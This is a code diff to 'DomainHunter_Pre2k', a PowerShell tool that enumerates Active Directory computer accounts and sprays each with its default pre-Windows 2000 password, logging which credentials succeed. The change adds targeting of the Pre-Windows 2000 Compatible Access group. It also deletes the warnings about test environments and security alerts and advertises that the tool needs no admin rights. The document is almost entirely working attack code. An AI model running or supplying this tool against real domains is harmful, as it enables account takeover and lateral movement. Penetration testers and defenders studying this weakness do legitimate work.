@@ -12,6 +12,7 @@ The tool performs password spraying against computer accounts using their pre-Wi
 - Automated computer account enumeration
 - Pre-Windows 2000 password testing
 - Age-based password filtering (30+ days)
+- Pre-Windows 2000 Compatible Access group targeting
 - Real-time success/failure logging
 - Progress tracking
 - Detailed output file generation
@@ -23,6 +24,10 @@ OutputPath
 
 FilterOld
     - Option to only test machines with passwords older than 30 days
+    - Input: y/n
+
+CheckGroup
+    - Option to only test machines in Pre-Windows 2000 Compatible Access group
     - Input: y/n
 
 .OUTPUTS
@@ -37,21 +42,17 @@ File:
     - Success/Failure status for each attempt
     - Computer name and tested password
 
-.EXAMPLE
-PS> .\DomainHunter_Pre2k.ps1
-Enter the full path and filename for output: C:\temp\results.txt
-Filter for machines with passwords older than 30 days? (y/n): y
-
 .NOTES
 - Requires Domain User permissions
-- Best practiced in test environments first
-- May generate security alerts
-- Consider network impact when running
+- Works in constrained language mode
+- No local admin rights needed
 #>
 
 # User input configuration
 $OutputPath = Read-Host "Enter the full path and filename for output (e.g. C:\temp\results.txt)"
+New-Item -Path $OutputPath -ItemType File -Force | Out-Null
 $FilterOld = Read-Host "Filter for machines with passwords older than 30 days? (y/n)"
+$CheckGroup = Read-Host "Check Pre-Windows 2000 Compatible Access group members only? (y/n)"
 
 # Domain connection setup using ADSI
 $Root = New-Object DirectoryServices.DirectoryEntry
@@ -63,20 +64,46 @@ Write-Host "[+] Results will be saved to: $OutputPath"
 # LDAP search configuration
 $Searcher = New-Object DirectoryServices.DirectorySearcher
 $Searcher.SearchRoot = $Root
-$Searcher.Filter = "(&(objectClass=computer)(pwdLastSet=*))"
-$Computers = $Searcher.FindAll()
+
+# Configure search based on group membership if requested
+if ($CheckGroup -eq 'y') {
+    $GroupSearcher = New-Object DirectoryServices.DirectorySearcher
+    $GroupSearcher.SearchRoot = $Root
+    $GroupSearcher.Filter = "(&(objectClass=group)(objectSid=S-1-5-32-554))"
+    $Group = $GroupSearcher.FindOne()
+
+    if ($Group) {
+        Write-Host "[+] Found Pre-Windows 2000 Compatible Access group" -ForegroundColor Green
+        $Searcher.Filter = "(&(objectClass=computer)(memberOf=$($Group.Properties.distinguishedname)))"
+        Write-Host "[+] Targeting only computers in Pre-Windows 2000 group" -ForegroundColor Yellow
+        
+        $Computers = $Searcher.FindAll()
+        Write-Host "`n[+] Computers in group:" -ForegroundColor Cyan
+        foreach($Computer in $Computers) {
+            $PwdLastSet = $Computer.Properties["pwdlastset"][0]
+            $PwdLastSetDate = [DateTime]::FromFileTime($PwdLastSet)
+            $DaysOld = (New-TimeSpan -Start $PwdLastSetDate -End (Get-Date)).Days
+            Write-Host "    - $($Computer.Properties["samaccountname"][0]) - Password Last Set $DaysOld days" -ForegroundColor Cyan
+        }
+    } else {
+        Write-Host "[!] Pre-Windows 2000 Compatible Access group not found, targeting all computers" -ForegroundColor Red
+        $Searcher.Filter = "(&(objectClass=computer)(pwdLastSet=*))"
+        $Computers = $Searcher.FindAll()
+    }
+} else {
+    $Searcher.Filter = "(&(objectClass=computer)(pwdLastSet=*))"
+    $Computers = $Searcher.FindAll()
+}
 
 # Counter initialization
 $SuccessCount = 0
-$CurrentCount = 0
 $TotalCount = $Computers.Count
+
+Write-Host "`n[+] Found $TotalCount computers to test" -ForegroundColor Yellow
+Write-Host "[*] RUNNING... " -NoNewline -ForegroundColor Cyan
 
 # Main processing loop
 foreach($Computer in $Computers) {
-    # Progress display
-    $CurrentCount++
-    Write-Host "`r[*] RUNNING... ($CurrentCount/$TotalCount)" -NoNewline -ForegroundColor Cyan
-
     # Password age filtering logic
     if ($FilterOld -eq 'y') {
         try {
@@ -111,15 +138,15 @@ foreach($Computer in $Computers) {
             if ($Context.ValidateCredentials($Name, $Password)) {
                 $Result = "[TESTING] Computer: $Name Password: $Password SUCCESS"
                 Write-Host "`n$Result" -ForegroundColor Green
-                Add-Content $OutputPath $Result
+                Add-Content -Path $OutputPath -Value $Result
                 $SuccessCount++
             } else {
                 $Result = "[TESTING] Computer: $Name Password: $Password FAILED"
-                Add-Content $OutputPath $Result
+                Add-Content -Path $OutputPath -Value $Result
             }
         } catch {
             $Result = "[TESTING] Computer: $Name Password: $Password FAILED"
-            Add-Content $OutputPath $Result
+            Add-Content -Path $OutputPath -Value $Result
         }
     }
 }
@@ -128,3 +155,4 @@ foreach($Computer in $Computers) {
 Write-Host "`n[+] DomainHunter scan complete!" -ForegroundColor Yellow
 Write-Host "[+] Found $SuccessCount successful authentications" -ForegroundColor Yellow
 Write-Host "[+] Results saved to: $OutputPath" -ForegroundColor Yellow
+
